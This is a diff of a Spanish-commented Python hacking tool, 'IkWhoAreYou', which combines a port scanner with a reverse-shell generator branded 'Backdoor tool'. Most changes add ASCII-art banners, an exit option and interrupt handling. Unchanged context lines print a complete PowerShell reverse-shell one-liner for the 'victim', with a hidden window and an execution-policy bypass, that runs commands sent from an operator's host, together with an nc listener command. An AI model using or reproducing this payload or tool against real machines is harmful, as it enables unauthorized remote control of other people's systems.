@@ -33,6 +33,7 @@ class Option:
 # Crear instancias de la clase Option
 normalmode = Option(1, 'Modo normal: ver IP, sistema operativo, versión de Windows, etc.')
 reverseshelloption = Option(2, 'Linux/Windows')
+exitoption = Option(3, 'EXIT SYSTEM')
 # Inicializar colorama para la salida coloreada
 init(autoreset=True)
 
@@ -62,8 +63,29 @@ def check_system(ttl: int, ip_address: str):
         return False
 # Función para manejar el menú para la opción 1
 def option1_menu():
-    puertos_encontrados = []  # Lista para almacenar puertos encontrados
     os.system('clear')
+    print(f'''
+        {Fore.BLUE}
+         _nnnn_                      
+        dGGGGMMb     ,"""""""""""""".
+       @p~qp~~qMb      |Info time!|
+       M|+||+) M|   _;..............'
+       @,----.JM| -'
+      JS^\__/  qKL
+     dZP        qKRb
+    dZP          qKKb
+   fZP            SMMb
+   HZM            MMMM
+   FqM            MMMM
+ __| ".        |\dS"qML
+ |    `.       | `' \Zq
+_)      \.___.,|     .'
+\____   )MMMMMM|   .'
+     `-'       `--' hjm
+'''
+)
+    puertos_encontrados = []  # Lista para almacenar puertos encontrados
+
     print(f'{Fore.BLUE}Modo normal activado...')
     ip_address = input(f'{Fore.RED}{Style.BRIGHT}MODO NORMAL: Ingrese la IP de destino>{Fore.YELLOW} ')
     
@@ -96,13 +118,18 @@ def option1_menu():
 
     # Iterar a través del rango de puertos, verificando y agregando puertos abiertos a la lista
     for i in range(rango_puertos + 1):
+        try:
         # No verificar los puertos 80 o 443
-        if i == 80 or i == 443:
-            check_port(str(i), ip_address)
-        else:
-            if check_port(str(i), ip_address):
-                puertos_encontrados.append(i)
-                print(f'{Fore.BLUE}¡Puerto encontrado!')
+            if i == 80 or i == 443:
+                check_port(str(i), ip_address)
+            else:
+                if check_port(str(i), ip_address):
+                    puertos_encontrados.append(i)
+                    print(f'{Fore.BLUE}¡Puerto encontrado!')
+        except KeyboardInterrupt:
+            os.system('clear||cls')
+            break
+                
 
     # Imprimir los puertos encontrados
     for puerto in puertos_encontrados:
@@ -113,6 +140,7 @@ def option1_menu():
 def reverseshell(type, host, port):
     if type == 'windows':
         print(Fore.RESET)
+
         print('''Victim: powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('''+host,''','''+str(port)+''');$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"''')
         print(f'you: nc -lvnp {port}')
     if type == 'linux':
@@ -128,6 +156,26 @@ nc -lvnp {port}
     
 def option2_menu():
     os.system('clear')
+    print(f'''
+        {Fore.BLUE}
+         _nnnn_                      
+        dGGGGMMb     ,"""""""""""""".
+       @p~qp~~qMb    |Backdoor tool|
+       M|+||+) M|   _;..............'
+       @,----.JM| -'
+      JS^\__/  qKL
+     dZP        qKRb
+    dZP          qKKb
+   fZP            SMMb
+   HZM            MMMM
+   FqM            MMMM
+ __| ".        |\dS"qML
+ |    `.       | `' \Zq
+_)      \.___.,|     .'
+\____   )MMMMMM|   .'
+     `-'       `--' hjm
+'''
+)
     print(f'REVERSE SHELL GENERATOR')
     type = input(f'{Fore.BLUE}Reverse system (Linux/Windows):{Fore.YELLOW}').lower()
     host = input(f'{Fore.BLUE}Your tcp ip:{Fore.YELLOW}')
@@ -137,12 +185,34 @@ def option2_menu():
 
 # Función para inicializar el menú principal
 def init_menu():
+    print(f'''
+        {Fore.BLUE}
+         _nnnn_                      
+        dGGGGMMb     ,"""""""""""""".
+       @p~qp~~qMb    |IP INFORMATER|
+       @p~qp~~qMb    |Backdoor tool|
+       M|+||+) M|   _;..............'
+       @,----.JM| -'
+      JS^\__/  qKL
+     dZP        qKRb
+    dZP          qKKb
+   fZP            SMMb
+   HZM            MMMM
+   FqM            MMMM
+ __| ".        |\dS"qML
+ |    `.       | `' \Zq
+_)      \.___.,|     .'
+\____   )MMMMMM|   .'
+     `-'       `--' hjm
+'''
+)
     print(
         f"""
         {Fore.RED}{Style.BRIGHT}========================== ¡Hola! Bienvenido a IkWhoAreYou =======================
 
         {Fore.BLUE}[1]:{Fore.YELLOW} Modo normal (ver IP, Linux/Mac o Windows, versión de Windows, etc)
         {Fore.BLUE}[2]:{Fore.YELLOW} REVERSE SHELL (LINUX/WINDOWS)
+        {Fore.BLUE}[3]: {Fore.YELLOW} EXIT
         {Fore.RED}
         ================================================================================
         """
@@ -151,9 +221,38 @@ def init_menu():
         # Conseguimos la opción elegida
         option_choice = int(input(f'{Fore.BLUE}Seleccione una opción:>{Fore.YELLOW} '))
         if normalmode.is_selected(option_choice):
-            option1_menu()
+            try:
+                option1_menu()
+            except KeyboardInterrupt:
+                init_menu()
         elif reverseshelloption.is_selected(option_choice):
-            option2_menu()
+            try:
+                option2_menu()
+            except KeyboardInterrupt:
+                init_menu()
+        elif exitoption.is_selected(option_choice):
+            os.system('clear')
+            print(f'''
+        {Fore.BLUE}
+         _nnnn_                      
+        dGGGGMMb     ,"""""""""""""".
+       @p~qp~~qMb         |BYE!|
+       M|+||+) M|   _;..............'
+       @,----.JM| -'
+      JS^\__/  qKL
+     dZP        qKRb
+    dZP          qKKb
+   fZP            SMMb
+   HZM            MMMM
+   FqM            MMMM
+ __| ".        |\dS"qML
+ |    `.       | `' \Zq
+_)      \.___.,|     .'
+\____   )MMMMMM|   .'
+     `-'       `--' hjm
+'''
+)
+            sys.exit(0)
         else:
             print('Error: Por favor, ingrese una opción válida.')
             sys.exit(1)
@@ -167,4 +266,7 @@ def init_menu():
 
 # Ejecución principal: inicializar el menú principal y manejar interrupciones de teclado
 if __name__ == '__main__':
-    init_menu()
+    try:
+        init_menu()
+    except KeyboardInterrupt:
+        init_menu()
